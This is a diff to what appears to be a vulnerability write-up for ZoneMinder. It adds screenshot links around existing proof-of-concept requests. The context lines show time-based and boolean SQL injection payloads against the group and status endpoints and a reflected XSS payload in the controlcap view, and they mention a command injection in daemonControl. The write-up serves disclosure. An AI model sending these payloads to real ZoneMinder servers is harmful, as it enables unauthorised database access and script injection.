@@ -33,6 +33,10 @@ index.php?view=events&page=1&filter[Query][terms][0][attr]=MonitorId&filter[Quer
 
 The following information is the same, you need to adapt the corresponding version.
 
+
+![1.png](1.png)
+
+
 # sql query error Reflected xss
 
 when sql query error, sql error and message will be displayed without any validated, sanitised or output encoded.
@@ -73,6 +77,11 @@ newGroup[MonitorIds][]=1&newGroup[MonitorIds][]=2') or sleep(3)#&newGroup[Name]=
 Step2:
 http://127.0.0.1/zoneminder/www/?view=control&mid=1&group={groupid}
 ```
+Normal time
+![3.png](3.png)
+
+injected time
+![4.png](4.png)
 
 # skins/classic/views/controlcap.php Reflected xss
 
@@ -84,7 +93,7 @@ poc
 ```
 ?view=controlcap&newControl[MinTiltRange]=2333%22/%3E%3Cimg/src=/%20onerror=alert(1)%3E
 ```
-
+![5.png](5.png)
 # includes/functions.php daemonControl command injection
 
 ![image.png-92.9kB][9]
@@ -97,6 +106,11 @@ poc
 ```
 http://127.0.0.1/zoneminder/www/?request=status&entity=monitor&element=id&id=1&sort=123
 ```
+Normal time
+![6.png](6.png)
+
+injected time
+![7.png](7.png)
 
 # ajax/status.php line 393 sql injection
 
@@ -111,7 +125,7 @@ includes/functions.php line 1401 parameter sql come from $filter['terms'][$i]['c
 ```
 index.php?request=status&entity=nearevents&element=id&id=13&layout=text&filter[Query][terms][0][cnj]=233)%20||1=1%23
 ```
-
+![8.png](8.png)
 
   [1]: http://static.zybuluo.com/LoRexxar/ufoe8ar8rbq8nh505anfeiai/image.png
   [2]: http://static.zybuluo.com/LoRexxar/7ikqrdkra6d0rlau66nrctco/image.png
